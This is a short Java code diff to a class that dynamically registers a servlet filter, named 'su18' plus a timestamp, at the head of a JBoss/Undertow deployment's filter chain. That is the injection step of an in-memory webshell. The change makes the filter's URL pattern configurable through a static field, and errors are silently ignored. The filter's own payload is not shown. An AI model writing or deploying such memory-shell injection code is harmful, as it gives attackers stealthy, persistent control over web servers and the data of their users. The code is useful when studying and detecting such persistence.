@@ -18,10 +18,11 @@ import java.util.Map;
  */
 public class JBFMSFromContext implements Filter {
 
+	public static String pattern;
+
 	static {
 		try {
 			String filterName = "su18" + System.nanoTime();
-			String urlPattern = "/*";
 
 			HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
 			ServletContext         context = request.getServletContext();
@@ -46,7 +47,7 @@ public class JBFMSFromContext implements Filter {
 				deployment.getFilters().addFilter(filter);
 
 				// 0 表示把我们动态注册的 filter 放在第一位
-				deploymentInfo.insertFilterUrlMapping(0, filterName, urlPattern, DispatcherType.REQUEST);
+				deploymentInfo.insertFilterUrlMapping(0, filterName, pattern, DispatcherType.REQUEST);
 			}
 		} catch (Exception ignored) {
 		}
